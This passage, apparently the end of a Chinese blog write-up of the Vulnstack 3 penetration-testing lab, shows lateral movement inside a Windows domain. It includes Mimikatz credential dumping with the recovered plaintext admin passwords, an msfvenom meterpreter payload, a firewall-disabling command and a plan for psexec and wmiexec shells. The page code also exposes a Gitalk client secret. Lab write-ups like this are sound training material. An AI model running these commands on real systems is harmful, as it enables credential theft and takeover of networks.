<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains smbclient &#x2F;&#x2F;192.168.93.20&#x2F;C$ -U administrator</span><br><span class="line">smb: \&gt; put mimikatz.exe</span><br><span class="line">putting file mimikatz.exe as \mimikatz.exe (589.7 kb&#x2F;s) (average 589.7 kb&#x2F;s)</span><br><span class="line"></span><br><span class="line">C:\&gt;mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.log</span><br><span class="line">-----</span><br><span class="line">tspkg :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : TEST</span><br><span class="line">         * Password : zxcASDqw123!!</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : TEST</span><br><span class="line">         * Password : zxcASDqw123!!</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : TEST.ORG</span><br><span class="line">         * Password : zxcASDqw123!!</span><br><span class="line">-----</span><br></pre></td></tr></table></figure>

<p>有了这些密码，用wmiexec应该都能获取shell。</p>
<ul>
<li>Administrator|123qwe!ASD</li>
<li>TEST\Administrator|zxcASDqw123!!</li>
</ul>
<p>尝试让它们全部上线msf。win7和win2008用正向马或者psexec上线，域控关闭防火墙后用psexec成功上线</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;192.168.1.103 LPORT&#x3D;1233 -e x86&#x2F;shikata_ga_nai -f exe -o shell.exe</span><br><span class="line"></span><br><span class="line">C:\&gt;netsh advfirewall set allprofiles state off</span><br><span class="line">Ok.</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/21/att&ck03/image-20210923214824110.png" alt="image-20210923214824110"></p>
<p>找到“重要文件”</p>
<p><img src="/2021/09/21/att&ck03/image-20210923215241082.png" alt="image-20210923215241082"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次比较艰难，不过也了解了很多新姿势。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://whoamianony.top/2021/02/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/vulnstack/%E8%AE%B0%E4%B8%80%E6%AC%A1Vulnstack%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E5%9B%9B%EF%BC%89/">记一次Vulnstack靶场内网渗透（四）</a></p>
<p><a target="_blank" rel="noopener" href="https://c0okb.github.io/2020/11/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bvulnstack3/">内网渗透之vulnstack3</a></p>

  </div>
</article>

        
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
            <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
            <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
            <div id="gitalk-container"></div>
            <script type="text/javascript">
                var gitalk = new Gitalk({
                    clientID: '865c501b39a0463d23cc',
                    clientSecret: 'fb46ad89ef3857a05f0255f9d3c1f67e0929cbe7',
                    id: md5(window.location.pathname),
                    repo: 'b1ank1108.github.io',
                    owner: 'b1ank1108',
                    admin: 'b1ank1108',
                    distractionFreeMode: ''
                })
                gitalk.render('gitalk-container')
            </script>
            

        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/b1ank1108">Projects</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">外网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.b1ank.top/2021/09/21/att&amp;ck03/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&text=内网渗透学习-vulnstack（三）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&title=内网渗透学习-vulnstack（三）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&is_video=false&description=内网渗透学习-vulnstack（三）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=内网渗透学习-vulnstack（三）&body=Check out this article: https://blog.b1ank.top/2021/09/21/att&amp;ck03/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&title=内网渗透学习-vulnstack（三）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&title=内网渗透学习-vulnstack（三）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&title=内网渗透学习-vulnstack（三）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&title=内网渗透学习-vulnstack（三）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&name=内网渗透学习-vulnstack（三）&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.b1ank.top/2021/09/21/att&amp;ck03/&t=内网渗透学习-vulnstack（三）"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2018-2021
    b1ank
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/b1ank1108">Projects</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
